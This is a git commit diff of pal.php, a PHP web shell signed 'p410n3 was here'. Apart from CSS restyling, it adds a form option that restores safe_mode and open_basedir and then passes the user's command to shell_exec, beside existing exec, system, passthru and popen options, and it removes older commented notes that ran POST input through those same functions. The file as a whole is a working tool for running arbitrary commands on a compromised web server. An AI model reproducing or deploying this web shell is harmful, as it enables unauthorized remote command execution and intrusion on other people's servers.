8a4188c41df87218963bfc1b175751eac76bb2d1
_palonE <p410n3@gmail.com>
2018-09-04 16:46:24 +0200

    finalized recode

--- pal.php
+++ pal.php
@@ -9,30 +9,74 @@
     <style>
         body {
             font-family: Consolas;
+            background-color: #f6f8fa;
         }
 
         .container {
-            width: 100%;
+            margin: 30px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        .form {
+        .form form {
             margin-top: 50px;
 
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+        }
+
+        @media (min-width: 768px) {
+            .form form {
+                flex-direction: row;
+            }
+        }
+
+        .form * {
+            margin: 5px;
+        }
+
+        .form label {
+            font-size: 24px;
+        }
+
+        .form input,
+        .form select {
+            height: 30px;
+            width: 100%;
+            border-radius: 3px;
+            padding-left: 5px;
+
+            border: 1px solid grey;
+
+            box-sizing: border-box;
+        }
+
+        .form button {
+            height: 30px;
+            padding: 5px 15px;
+            color: white;
+            background-color: black;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .form button {
+            align-self: flex-end;
         }
 
         .code {
             margin-top: 30px;
             background-color: black;
-            color: green;
+            color: limegreen;
             padding: 10px;
             border-radius: 5px;
             font-size: 15px;
 
+            width: 800px;
             max-width: 90vw;
         }
 
@@ -47,7 +91,6 @@
     <div class="container">
         <div class="form">
             <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="get">
-
                 <label for="executioner">Command: </label>
                 <select name="executioner" id="executioner">
                     <option value="exec">exec</option>
@@ -55,6 +98,7 @@
                     <option value="shell_exec">shell_exec</option>
                     <option value="system">system</option>
                     <option value="popen">popen (live!)</option>
+                    <option value="shell_exec_bypass">shell_exec // safe_mode bypass</option>
                 </select>
 
                 <input type="text" name="cmd" placeholder="cmd" id="cmd">
@@ -93,34 +137,29 @@
                             }
                             pclose($proc);
                             break;
+
+                        case "shell_exec_bypass":
+                            ini_restore("safe_mode");
+                            ini_restore("open_basedir");
+                            echo shell_exec($cmd);
+                            break;
                     }
 
+                } else {
+                    echo('p410n3 was here');
                 }
             ?>
             </pre>
         </div>
     </div>
     <script>
-        console.log(window.location.search.substr(1).split("&")[0].split("=")[1]);
+        //detects the cuurent executioner GET parameter by
+        // splitting some stuff from window.location.search
+        var curExecutioner = window.location.search.substr(1).split("&")[0].split("=")[1];
+
+        if (curExecutioner != undefined) {
+            document.getElementById("executioner").value = curExecutioner;
+        }
     </script>
 </body>
 </html>
-<?php
-//notes
-/*
-passthru($_POST['passthru_cmd']);
-
-system($_POST['system_cmd']);
-
-echo shell_exec($_POST['shell_exec_cmd']);
-
-//start command and output console
-$proc = popen($_POST['popen_cmd'], 'r');
-while (!feof($proc)) {
-echo fread($proc, 4096);
-@ flush();
-}
-pclose($proc);
-
-exec($_POST['exec_cmd'], $out);
-print_r($out); */
